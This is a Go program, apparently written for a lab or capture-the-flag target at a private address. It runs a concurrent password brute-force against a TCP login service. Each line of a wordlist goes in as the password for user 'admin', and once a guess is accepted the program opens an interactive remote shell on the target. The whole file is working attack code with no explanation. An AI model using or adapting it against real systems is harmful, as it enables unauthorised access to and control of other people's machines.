package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
)

var (
	done     bool
	password string
)

func main() {
	done = false
	fmt.Println("Start...")

	f, err := os.OpenFile("test", os.O_RDONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	jobs := make(chan string, 10)

	worker := 15
	wg := sync.WaitGroup{}
	for i := 0; i < worker; i++ {
		if done {
			break
		}
		wg.Add(1)
		go work(jobs, &wg)
	}

	go func() {
		for scanner.Scan() {
			jobs <- scanner.Text()
		}
		close(jobs)
	}()

	wg.Wait()
	if !done {
		fmt.Println("Couldn't find password")
		return
	}

	interactiveShell()
}

func work(jobs chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	if done {
		return
	}

	for t := range jobs {
		if done {
			return
		}

		wg := sync.WaitGroup{}
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.Dial("tcp", "10.10.160.15:8000")
			if err != nil {
				log.Fatal(err)
			}
			defer conn.Close()

			if _, err := conn.Write([]byte("admin\n")); err != nil {
				log.Fatal(err)
			}

			buf := make([]byte, 2048)
			if _, err := (conn).Read(buf); err != nil {
				log.Fatal(err)
			}
			clear(buf)

			if _, err := (conn).Write([]byte(t + "\n")); err != nil {
				log.Fatal(err)
			}

			if _, err := (conn).Read(buf); err != nil {
				log.Fatal(err)
			}

			if !strings.Contains(string(buf), "Password:") {
				password = t
				done = true
			}
		}()
		wg.Wait()
	}
}

func interactiveShell() {
	conn, err := net.Dial("tcp", "10.10.160.15:8000")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	if _, err := conn.Write([]byte("admin\n")); err != nil {
		log.Fatal(err)
	}

	buf := make([]byte, 2048)
	if _, err := conn.Read(buf); err != nil {
		log.Fatal(err)
	}
	clear(buf)

	if _, err := conn.Write([]byte(password)); err != nil {
		log.Fatal(err)
	}

	if _, err := conn.Read(buf); err != nil {
		log.Fatal(err)
	}
	clear(buf)

	if _, err := conn.Write([]byte("shell")); err != nil {
		log.Fatal(err)
	}

	if _, err := conn.Read(buf); err != nil {
		log.Fatal(err)
	}
	fmt.Print(string(buf))
	clear(buf)

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		text := scanner.Text()
		buf := make([]byte, 2048)

		if _, err := conn.Write([]byte(text + "\n")); err != nil {
			log.Fatal(err)
		}

		if _, err := conn.Read(buf); err != nil {
			log.Fatal(err)
		}

		fmt.Print(string(buf))
		clear(buf)
	}
}
